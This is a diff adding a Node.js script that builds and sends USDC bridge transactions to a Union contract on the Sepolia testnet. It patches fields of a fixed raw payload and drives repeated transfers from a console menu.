+// ============= Core Transaction Function =============
+async function sendRawPayloadTx(usdcAmount) {
+    try {
+        // Format the USDC value for payload
+        const usdcValueHex = formatUsdcValue(usdcAmount);
+
+        const nonce = await provider.getTransactionCount(wallet.address, "pending");
+        const feeData = await provider.getFeeData();
+
+        let maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits("20", "gwei");
+        let maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei");
+        if (maxPriorityFeePerGas > maxFeePerGas) {
+            maxPriorityFeePerGas = maxFeePerGas;
+        }
+
+        // Replace timestamp
+        const oldTimestamp = "0000000000000000000000000000000000000000000000001847fd16b0cc1680";
+        const newTimestamp = generateUnionTimeoutTimestampHex();
+        let modifiedPayload = replace32ByteField(PAYLOAD, oldTimestamp, newTimestamp);
+
+        // Replace salt
+        const oldSalt = "c4a4ac8498b7672663317420ea7d0276e8c735805650517d6491ed3703a2c1f3";
+        const newSalt = generateSalt().slice(2);
+        modifiedPayload = replace32ByteField(modifiedPayload, oldSalt, newSalt);
+
+        // Replace sender wallet address (twice)
+        const oldSenderWallet = "78ff133dd6be81621062971a7b0f142e9f532d51000000000000000000000000";
+        const newSenderWallet = wallet.address.slice(2).padEnd(64, '0');
+        modifiedPayload = replace32ByteField(modifiedPayload, oldSenderWallet, newSenderWallet);
+        modifiedPayload = replace32ByteField(modifiedPayload, oldSenderWallet, newSenderWallet);
+
+        // Replace USDC value in payload (twice)
+        const oldValueInPayload = "00000000000000000000000000000000000000000000000000000000000f4240";
+        const newValueInPayload = to32ByteHex(usdcValueHex);
+        modifiedPayload = replace32ByteField(modifiedPayload, oldValueInPayload, newValueInPayload);
+        modifiedPayload = replace32ByteField(modifiedPayload, oldValueInPayload, newValueInPayload);
+
+        // Verify payload length
+        if (modifiedPayload.length !== 2440) {
+            throw new Error(`Invalid payload length: ${modifiedPayload.length}, expected 2440 hex chars`);
+        }
+
+        const tx = {
+            to: UNION_CONTRACT_ADDRESS,
+            data: '0x' + modifiedPayload,
+            value: 0, // No ETH sent for ERC-20 transfer
+            gasLimit: 300000,
+            maxFeePerGas: maxFeePerGas,
+            maxPriorityFeePerGas: maxPriorityFeePerGas,
+            nonce: nonce,
+            chainId: CHAIN_ID,
+        };
+
+        console.log("\n📤 Sending transaction...");
+        console.log(`💰 USDC amount (units): ${ethers.parseUnits(usdcAmount, 6)}`);
+        console.log(`⛽ Gas fees (ETH): maxFeePerGas=${maxFeePerGas}, maxPriorityFeePerGas=${maxPriorityFeePerGas}`);
+        console.log(`🔐 Sender: ${wallet.address}`);
+        console.log(`🧂 Salt: 0x${newSalt}`);
+        console.log(`⏰ Timestamp: 0x${newTimestamp}`);
+        const txResponse = await wallet.sendTransaction(tx);
+        console.log("📜 Transaction hash:", txResponse.hash);
+        console.log(`🔍 View on Sepolia Testnet: https://sepolia.etherscan.io/tx/${txResponse.hash}`);
+
+        const receipt = await txResponse.wait();
+        console.log("📌 Transaction Status:", receipt.status === 1 ? "✅ Success" : "❌ Failed");
+
+        if (receipt.status === 1) {
+            console.log("\n🔍 Checking for packet hash...");
+            const packetHash = await pollPacketHash(txResponse.hash);
+            if (packetHash) {
+                console.log("🎉 Final Packet Hash:", packetHash);
+            } else {
+                console.log("❌ Failed to get packet hash after maximum retries");
+            }
+        }
+    } catch (err) {
+        console.error("\n❌ Transaction Error ❌");
+        console.error("Type:", err.name);
+        console.error("Message:", err.message);
+        if (err.data) {
+            console.error("Data:", err.data);
+        }
+        console.error("Modified Payload:", `0x${modifiedPayload}`);
+        console.error("========================");
+    }
+}
+
+// ============= Main Menu Loop =============
+async function mainMenu() {
+    while (true) {
+        displayBanner();
+        displayMenu();
+
+        const choice = await getUserInput("👉 Enter your choice (1-3): ");
+
+        // Validate choice
+        if (!['1', '2', '3'].includes(choice)) {
+            console.log(`\n❌ Invalid choice: "${choice}". Please enter 1, 2, or 3.`);
+            await sleep(1500);
+            continue;
+        }
+
+        switch (choice) {
+            case '1':
+                try {
+                    const singleParams = await getTransferParams();
+                    await executeTransfers(singleParams);
+                } catch (err) {
+                    console.error(`\n❌ Error: ${err.message}`);
+                }
+                await getUserInput("\n✨ Press Enter to return to menu...");
+                break;
+
+            case '2':
+                try {
+                    const multiParams = await getTransferParams();
+                    if (multiParams.count < 2) multiParams.count = 2;
+                    await executeTransfers(multiParams);
+                } catch (err) {
+                    console.error(`\n❌ Error: ${err.message}`);
+                }
+                await getUserInput("\n✨ Press Enter to return to menu...");
+                break;
+
+            case '3':
+                console.log("\n👋 Goodbye!");
+                rl.close();
+                process.exit(0);
+
+            default:
+                console.log("\n❌ Unexpected error. Please try again.");
+                await sleep(1500);
+        }
+    }
+}
+
+if (require.main === module) {
+    mainMenu();
+}
+
+module.exports = { mainMenu };
